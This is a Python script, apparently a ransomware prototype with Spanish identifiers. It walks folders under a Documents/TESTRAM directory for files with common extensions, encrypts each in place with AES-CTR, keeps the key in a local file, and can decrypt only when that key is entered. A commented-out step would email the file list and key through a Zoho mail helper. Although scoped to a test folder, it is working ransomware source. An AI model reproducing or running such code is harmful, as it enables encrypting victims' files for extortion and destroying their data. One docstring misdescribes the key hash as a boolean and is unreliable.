import os
import socket
import hashlib
import secrets
from Crypto.Util import Counter
from Crypto.Cipher import AES

from mail.SendMail import SendMail

home = os.environ['HOME'] + '/Documents/TESTRAM'
folders = [x for x in os.listdir(home) if not x.startswith('.')]
extensiones = ['.mp3', '.mp4', '.avi', '.jpeg', '.zip', '.dat', '.rar', '.txt', '.png', '.jpg', '.pdf', 'xlsx']

def check_conection_internet():
    """
    The function checks if the system is connected to the internet by attempting to connect to a
    specific server.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('socket.io', 80))
        print("Sistema conectado a la nube \n")
        s.close()
    except KeyboardInterrupt:
        exit()

def get_hash():
    """
    The function `get_hash()` generates a unique hash based on the user's home directory, username,
    hostname, and a random number, and returns a 32-character string.
    :return: a 32-character hash value generated from a combination of the user's home directory,
    username, hostname, and a random number.
    """
    hascomputer = os.environ['HOME'] + os.environ['USER'] + socket.gethostname() + str(secrets.randbits(256))
    hascomputer_bytes = hascomputer.encode('utf-8')
    hascomputer = hashlib.sha512(hascomputer_bytes)
    hascomputer = hascomputer.hexdigest()

    return  hascomputer[:32]

def change_name(archivo):
    prefijo = 'encript_'
    nombre_archivo = os.path.basename(archivo)
    nuevo_nombre = prefijo + nombre_archivo
    directorio = os.path.dirname(archivo)
    ruta_nuevo_archivo = os.path.join(directorio, nuevo_nombre)
    os.rename(archivo, ruta_nuevo_archivo)

def change_back_name(archivo):
    prefijo = 'encript_'
    nombre_archivo = os.path.basename(archivo)
    
    # Verificar si el prefijo está presente y quitarlo
    if nombre_archivo.startswith(prefijo):
        nuevo_nombre = nombre_archivo[len(prefijo):]
        print(nuevo_nombre)
        
        directorio = os.path.dirname(archivo)
        ruta_nuevo_archivo = os.path.join(directorio, nuevo_nombre)
        os.rename(archivo, ruta_nuevo_archivo)
    else:
        pass

def encrypt_and_decrypt(archivo, crypto, block_size=16, desencriptar=False):
    with open(archivo, 'r+b') as archivo_enc:
        contenido_sin_cifrar = archivo_enc.read(block_size)
        while contenido_sin_cifrar:
            if desencriptar:
                contenido_cifrado = crypto.decrypt(contenido_sin_cifrar)
            else:
                contenido_cifrado = crypto.encrypt(contenido_sin_cifrar)

            archivo_enc.seek(-len(contenido_sin_cifrar), 1)
            archivo_enc.write(contenido_cifrado)
            contenido_sin_cifrar = archivo_enc.read(block_size)
    
    # if desencriptar:
    #     change_back_name(archivo)
    # else:
    #     change_name(archivo)


def generate_list_file():
    """
    The function "discover" searches for files with specific extensions in specified folders and writes
    their paths to a file.
    """
    file_list = open('file_list', 'w+')
    for folder in folders:
        ruta = home + '/' + folder
        for extension in extensiones:
            for rutaabs, directorio, archivo in os.walk(ruta):
                for file in archivo:
                    if file.endswith(extension):
                        file_list.write(os.path.join(rutaabs, file) + '\n')
    file_list.close()

def discover(key):
    generate_list_file()
    lista = open('file_list', 'r')
    lista = lista.read().split('\n')
    lista = [l for l in lista if not l == ""]

    if os.path.exists('key_file'):
        print('decrypt')
        key1 = input('Key:')
        key_file = open('key_file', 'r')
        key = key_file.read().split('\n')
        key = ''.join(key)
        if key1 == key:
            c = Counter.new(128)
            crypto = AES.new(key.encode('utf-8'), AES.MODE_CTR, counter=c)
            cryptarchives = crypto
            # cryptarchives = crypto.decrypt

            for element in lista:
                encrypt_and_decrypt(archivo=element, crypto=cryptarchives, desencriptar=True)
        pass

    else:
        keya = key.encode('utf-8')
        c = Counter.new(128)
        crypto = AES.new(keya, AES.MODE_CTR, counter=c)
        key_file = open('key_file', 'w+')
        key_file.write(key)
        key_file.close()
        cryptarchives = crypto
        # cryptarchives = crypto.encrypt

        for element in lista:
            encrypt_and_decrypt(archivo=element, crypto=cryptarchives)
        
        print('Archivos encriptados.')
    # generate_list_file()
    

def send_email(hascomputer):
    """
    Sends an email using the Zoho mail service and attaches a file named 'file_list'.
    :param hascomputer: A boolean value indicating whether the user has a computer or not
    """
    sendMail = SendMail(key=hascomputer)
    sendMail.send_email_zoho(file_to_attach='file_list')

def main():
    check_conection_internet()
    hascomputer = get_hash()
    print("Encriptando informacion...")
    discover(hascomputer)
    # print("Enviando Correo electronico...")
    # send_email(hascomputer=hascomputer)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Ha ocurrido un error')
        exit()
